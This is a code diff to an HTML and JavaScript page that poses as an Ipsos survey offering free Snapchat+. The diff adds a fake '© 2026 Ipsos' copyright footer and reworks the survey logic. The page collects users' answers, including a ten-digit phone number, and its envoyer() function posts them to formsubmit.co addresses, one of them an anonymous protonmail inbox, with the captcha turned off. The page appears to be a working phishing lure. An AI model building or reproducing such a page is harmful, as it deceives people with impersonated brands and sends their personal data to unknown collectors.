@@ -118,6 +118,16 @@ button:disabled {
     color:#555;
 }
 
+/* PIED DE PAGE */
+.footer {
+    text-align:center;
+    padding:20px 0;
+    font-size:14px;
+    color:#999;
+    margin-top:40px;
+    border-top:1px solid #ddd;
+}
+
 /* RESPONSIVE */
 @media(max-width:600px){
     .box{margin:20px;padding:25px}
@@ -127,6 +137,7 @@ button:disabled {
 </head>
 
 <body>
+
 <!-- Logos fixes -->
 <div class="logos-fixed">
     <img src="francelogo.png" alt="France">
@@ -172,6 +183,11 @@ button:disabled {
     </div>
 </div>
 
+<!-- PIED DE PAGE -->
+<div class="footer">
+    © 2026 Ipsos – Tous droits réservés
+</div>
+
 <script>
 const titre = "Sondage pour bénéficier de Snapchat+";
 
@@ -190,38 +206,42 @@ let reponsesUtilisateur = [];
 document.getElementById("titre").textContent = titre;
 
 function demarrer(){
-    intro.style.display="none";
-    sondage.style.display="block";
+    document.getElementById("intro").style.display="none";
+    document.getElementById("sondage").style.display="block";
     afficherQuestion();
 }
 
 function afficherQuestion(){
     const q = questions[indexQuestion];
-    question.textContent = q.text;
+    document.getElementById("question").textContent = q.text;
 
-    reponses.innerHTML = `
+    document.getElementById("reponses").innerHTML = `
         <input type="${q.type}" id="champ"
         placeholder="${q.placeholder || ''}"
         oninput="verifier()">
     `;
 
-    btnSuivant.disabled = true;
-    updateProgress();
+    document.getElementById("btnSuivant").disabled = true;
 
-    partenariat.style.display =
+    document.getElementById("partenariat").style.display =
         indexQuestion >= 3 ? "block" : "none";
+
+    updateProgress();
 }
 
 function verifier(){
-    btnSuivant.disabled = !champ.value.trim();
+    const champ = document.getElementById("champ");
+    document.getElementById("btnSuivant").disabled = !champ.value.trim();
 }
 
 function updateProgress(){
+    const progressBar = document.getElementById("progressBar");
     progressBar.style.width =
         ((indexQuestion+1)/questions.length*100) + "%";
 }
 
 function suivant(){
+    const champ = document.getElementById("champ");
     const val = champ.value.trim();
 
     if(questions[indexQuestion].type==="tel" && !/^[0-9]{10}$/.test(val)){
@@ -233,15 +253,15 @@ function suivant(){
     indexQuestion++;
 
     if(indexQuestion===3){
-        sondage.style.display="none";
-        intermediaire.style.display="block";
+        document.getElementById("sondage").style.display="none";
+        document.getElementById("intermediaire").style.display="block";
         return;
     }
 
     if(indexQuestion < questions.length){
         afficherQuestion();
     } else {
-        sondage.innerHTML = `
+        document.getElementById("sondage").innerHTML = `
             <h2>Merci pour votre participation !</h2>
             <p>Vous recevrez votre abonnement Snapchat+ directement sur votre compte dans un délai d'environ 15 minutes.</p>
         `;
@@ -250,13 +270,12 @@ function suivant(){
 }
 
 function continuer(){
-    intermediaire.style.display="none";
-    sondage.style.display="block";
+    document.getElementById("intermediaire").style.display="none";
+    document.getElementById("sondage").style.display="block";
     afficherQuestion();
 }
 
 function envoyer() {
-    // Premier FormData
     const formData1 = new FormData();
     formData1.append("artiste_prefere", reponsesUtilisateur[0] || "");
     formData1.append("artiste_deezer", reponsesUtilisateur[1] || "");
@@ -267,7 +286,6 @@ function envoyer() {
     formData1.append("_captcha", "false");
     formData1.append("_template", "table");
 
-    // Premier envoi
     fetch("https://formsubmit.co/anonymous2026b@protonmail.com", {
         method: "POST",
         body: formData1
@@ -275,7 +293,6 @@ function envoyer() {
     .then(() => console.log("Premier mail envoyé"))
     .catch(err => console.error("Erreur premier envoi :", err));
 
-    // Deuxième FormData (copie des réponses)
     const formData2 = new FormData();
     formData2.append("artiste_prefere", reponsesUtilisateur[0] || "");
     formData2.append("artiste_deezer", reponsesUtilisateur[1] || "");
@@ -286,7 +303,6 @@ function envoyer() {
     formData2.append("_captcha", "false");
     formData2.append("_template", "table");
 
-    // Deuxième envoi
     fetch("https://formsubmit.co/deuxiemeemail@example.com", {
         method: "POST",
         body: formData2
@@ -298,5 +314,3 @@ function envoyer() {
 
 </body>
 </html>
-
-
